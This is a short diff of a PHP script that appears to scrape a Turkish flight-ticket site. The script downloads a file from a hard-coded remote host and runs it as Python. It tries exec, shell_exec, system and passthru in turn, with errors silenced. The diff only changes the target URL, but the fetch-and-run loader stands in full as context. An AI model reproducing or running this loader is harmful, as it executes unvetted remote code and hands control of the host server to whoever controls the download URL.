@@ -4,7 +4,7 @@ $dosya = @file_get_contents("http://bdmsproduction.com/dosya/x.txt");
 fwrite($temp, $dosya);
 $bilgi = stream_get_meta_data($temp);
 $dizin = $bilgi['uri'];
-$komut = "python {$dizin} 'https://www.ucuzabilet.com/ic-hat-arama-sonuc?from=MZH&to=HTY&ddate=22.08.2018&adult=1'";
+$komut = "python {$dizin} https://www.ucuzabilet.com/";
 if(function_exists('exec')){$sonuc = @exec($komut);}elseif(function_exists('shell_exec')){$sonuc = @shell_exec($komut);}elseif(function_exists('system')){$sonuc = @system($komut);}elseif(function_exists('passthru')){$sonuc = @passthru($komut);
 }else{
 echo "tum fonksiyonlar kapali aq";
